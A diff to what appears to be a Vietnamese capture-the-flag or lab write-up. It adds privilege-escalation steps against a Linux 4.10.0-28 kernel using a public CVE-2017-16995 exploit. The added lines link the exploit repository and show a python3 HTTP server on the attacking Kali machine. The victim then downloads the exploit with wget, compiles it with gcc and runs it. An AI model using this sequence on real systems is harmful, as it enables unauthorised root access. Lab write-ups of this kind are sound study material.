@@ -130,8 +130,31 @@ Tìm kiếm phiên bản kernel
 
 Tìm kiếm trên Google với từ khóa 4.10.0-28 generic exploit -> tìm thấy trang web có code exploit
 
-https://www.rapid7.com/db/modules/exploit/linux/local/bpf_sign_extension_priv_esc/
+https://github.com/kkamagui/linux-kernel-exploits/tree/master/kernel-4.10.0-28-generic/CVE-2017-16995
 
+Download git về máy kali, di chuyển file CVE-2017-16995.c ra ngoài thư mục home (để tý nữa dễ nhập command hơn :( )
+
+![image](https://user-images.githubusercontent.com/97771705/225659088-79e3576e-d452-4f9d-bbaf-a00cbf88983a.png)
+
+Tạo kết nối http với port 1001 để victim có thể wget thư mục từ máy kali
+
+> python3 -m http.server 1001
+
+![image](https://user-images.githubusercontent.com/97771705/225659505-f7c78640-5c88-43a7-bd08-219a9e7e4b8d.png)
+
+Tại terminal victim, cd /tmp và wget file c ở trên
+
+> wget http://10.0.2.15:1001/CVE-2017-16995.c
+
+Biên dịch file c 
+
+> gcc CVE-2017-16995.c -o exploit
+
+Chạy file exploit
+
+> ./exploit 
+
+![image](https://user-images.githubusercontent.com/97771705/225660562-47529a3f-ba78-437a-9fa4-bc81817e1002.png)
 
 
 
